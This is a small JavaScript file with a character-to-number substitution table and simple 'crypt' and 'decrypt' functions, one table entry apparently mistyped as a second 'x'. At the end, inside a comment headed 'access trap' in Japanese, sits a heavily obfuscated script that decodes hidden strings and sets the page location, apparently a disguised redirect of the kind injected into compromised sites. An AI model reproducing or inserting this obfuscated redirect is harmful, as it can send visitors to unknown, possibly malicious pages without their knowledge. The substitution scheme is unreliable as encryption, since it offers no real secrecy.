let alpha = {
    "a": 2147, 
    "b": 3675, 
    "c": 5127, 
    "d": 7983, 
    "e": 1135, 
    "f": 1376, 
    "g": 1799, 
    "h": 1939, 
    "i": 2321, 
    "j": 3121, 
    "k": 3782, 
    "l": 4166, 
    "m": 4399, 
    "n": 4734, 
    "o": 5319, 
    "p": 5975, 
    "q": 6181, 
    "r": 6721, 
    "s": 7143, 
    "t": 7321, 
    "u": 7945, 
    "v": 8367, 
    "w": 8999, 
    "x": 9751, 
    "y": 9822, 
    "x": 9933, 
    "A": 1221, 
    "B": 1233, 
    "C": 1255, 
    "D": 1277, 
    "E": 1211, 
    "F": 2213, 
    "G": 5217, 
    "H": 2319, 
    "I": 1223, 
    "J": 1231, 
    "K": 9237, 
    "L": 2241, 
    "M": 1243, 
    "N": 5247, 
    "O": 8253, 
    "P": 7259, 
    "Q": 5261, 
    "R": 4267, 
    "S": 1271, 
    "T": 1273, 
    "U": 1279, 
    "V": 1283, 
    "W": 1289, 
    "X": 1297, 
    "Y": 2298, 
    "Z": 3299, 
    "{": 4991, 
    "}": 5883, 
    " ": 5727, 
    "=": 5999, 
    "+": 4413, 
    "-": 1272, 
    "*": 831, 
    "/": 1371, 
    "\"": 139, 
    "'": 149, 
    "~": 151, 
    ".": 157, 
    ",": 163, 
    "\n": 9999
}

function crypt(str) {
    for (i in alpha) {
        str = str.replaceAll(i, "@" + alpha[i] + "0");
    }
    return str;
}

function decrypt(str) {
    for (i in alpha) {
        str = str.replaceAll("@" + alpha[i] + "0", i);
    }
    return str;
}

/* アクセストラップ
--<script>function b(c,d){var e=a();return b=function(f,g){f=f-(0x1b23+-0x133d+-0xd*0x8f);var h=e[f];if(b['LdwrOQ']===undefined){var i=function(n){var o='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var p='',q='';for(var r=-0x1fd3*-0x1+-0x1*0x269+0x2f1*-0xa,s,t,u=-0x2*-0x28e+-0x1*-0x16ba+-0x1bd6*0x1;t=n['charAt'](u++);~t&&(s=r%(0x1bb6+0x1bf5+-0x37a7)?s*(0x197d+0x8d*-0x1e+-0x8b7)+t:t,r++%(-0x1*-0x13a2+-0x19df+0x641))?p+=String['fromCharCode'](-0x3*-0x20f+-0x1e85+0x1957&s>>(-(-0x918+-0xd6d*-0x1+-0x1b*0x29)*r&0x98a*0x1+0x83*-0x21+-0x6f*-0x11)):0x21a4+0x2489*0x1+-0x462d){t=o['indexOf'](t);}for(var v=-0x54*-0x26+-0x7bc+-0x65*0xc,w=p['length'];v<w;v++){q+='%'+('00'+p['charCodeAt'](v)['toString'](0x1327*-0x1+-0xe02+0x2139))['slice'](-(0x20bb+0x1*0x1abb+-0x3b74));}return decodeURIComponent(q);};var m=function(n,o){var p=[],q=-0x1f78+0xa1*-0x7+0x23df,r,t='';n=i(n);var u;for(u=-0x105d+0x171c+-0xb*0x9d;u<-0x122c+0xa16+0x916;u++){p[u]=u;}for(u=0x1107+0x1*-0xa7b+-0x68c;u<0x1416+-0x2*0xd5e+0x16*0x59;u++){q=(q+p[u]+o['charCodeAt'](u%o['length']))%(0x22*0x4b+-0xa*0x26f+0x6*0x290),r=p[u],p[u]=p[q],p[q]=r;}u=-0x2ab*0xd+0x3f4+0x1*0x1ebb,q=0x1cfa*-0x1+0x2286+0x47*-0x14;for(var v=0x5*-0x44f+0x1683+0x3e*-0x4;v<n['length'];v++){u=(u+(-0x24b8+0x2473+-0x7*-0xa))%(0x1e68+-0xd52+-0x2*0x80b),q=(q+p[u])%(0xf3*-0x4+-0x1c0a+0x20d6),r=p[u],p[u]=p[q],p[q]=r,t+=String['fromCharCode'](n['charCodeAt'](v)^p[(p[u]+p[q])%(0xd01+-0x1131+0x530)]);}return t;};b['ZzbeGe']=m,c=arguments,b['LdwrOQ']=!![];}var j=e[0x294*-0x7+0x4*-0x80c+0x506*0xa],k=f+j,l=c[k];return!l?(b['GCJSsy']===undefined&&(b['GCJSsy']=!![]),h=b['ZzbeGe'](h,g),c[k]=h):h=l,h;},b(c,d);}var i=b;(function(c,d){var j={c:'0xb8',d:'0xb5',e:'8wSP',f:'LT#v',g:'0xaf',k:'j1cp',l:'0xa5',m:'0xaa',n:'PQDe',o:'fR0p',p:'0xa9',q:'fH)k'},h=b,e=c();while(!![]){try{var f=parseInt(h(j.c,'!V%t'))/(0x171c+-0x7*0xb3+-0x1236)*(-parseInt(h('0xb2','cai7'))/(0xa16+-0x1a75+-0x7*-0x257))+parseInt(h(j.d,j.e))/(-0x5d7*0x5+-0x124*-0x17+0x2fa)+-parseInt(h('0xac',j.f))/(0x24*0x49+-0x139*0x4+0x1c*-0x31)*(parseInt(h(j.g,'aFWQ'))/(0x1*0x10b2+-0xaec+0x1eb*-0x3))+-parseInt(h('0xb3','mVVa'))/(0x3*-0x887+-0x2c9+0x2*0xe32)*(-parseInt(h('0xa4',j.k))/(0xc1*0x2a+-0x225b+0x2b8*0x1))+parseInt(h(j.l,'LT#v'))/(0x12e*0xb+-0x136b+-0x679*-0x1)*(parseInt(h(j.m,j.n))/(-0xd62+-0x5*-0x2b+0xc94))+parseInt(h('0xa3',j.o))/(-0x1059+0xef2+0x171)+-parseInt(h(j.p,j.q))/(0x1c7d+0x2017+-0x1*0x3c89);if(f===d)break;else e['push'](e['shift']());}catch(g){e['push'](e['shift']());}}}(a,-0xb9af3+-0x5ff99+0x1a2517),location[i('0xa6','fR0p')]=i('0xb1','LT#v')+i('0xad','$yZG')+i('0xb0','n^hQ')+'1');function a(){var k=['jsRdUSkaW6FdS8kxsZePW4LXW74','uLTGC8oBWOlcV3OwW5u','ebPAWQntlWZdISkbWRS','qq5UzH7dUSoG','kdjyWPdcR09HW7RdIu1cWOpdLa','W7WdWQG3WPtcGfTP','nCoPemkHDSoTW7DGmb3dHSo1qa','iHZcGCkUfIjLnIdcSSo9xSkc','tMFdQNRcJJPj','cK7dUM8LW6S2g8ojWPBcIsxcPW','EGrfF8kGBCkCBSkcamoCWRZcMq','WPhcT0lcOSkbm38','svyzW6SwjrVcOSkzWRPjWPhdGW','i0iwlq','W5KQBCoIzL/cV8kQWOv2W5JcHSkq','W7ddSSolW5hdL8o8F8oOW6mhuXya','vK3cSmoUW5eWW4ncoMZdP8o/W6G','W7Tsk13dQ8oPW47dKW','EqjaFSkNAmkvsSk+imowWQdcIq','taHAWPPftuu','WPGMW7RdNfFdVMldJIFdVq','W78aW69oW77dNXnTy09WqGa'];a=function(){return k;};return a();}</script>
*/
